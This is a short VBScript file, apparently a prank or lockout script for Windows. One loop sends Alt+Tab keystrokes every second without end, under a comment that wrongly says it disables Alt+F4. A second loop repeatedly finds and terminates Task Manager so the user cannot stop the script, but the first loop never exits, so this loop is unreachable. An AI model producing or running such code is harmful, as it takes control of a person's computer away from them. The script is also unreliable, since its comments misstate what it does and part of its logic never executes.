Set WshShell = CreateObject("WScript.Shell")

' Disable Alt + F4 by repeatedly focusing on an application
Do
    WshShell.SendKeys "%{TAB}" ' Alt + Tab (to focus on another window)
    WScript.Sleep 1000 ' Sleep for 1 second to give some time to process
Loop

' Close Task Manager repeatedly
Do
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colItems = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'Taskmgr.exe'")
    For Each objItem in colItems
        objItem.Terminate
    Next
    WScript.Sleep 500 ' Sleep for 500 milliseconds before retrying
Loop
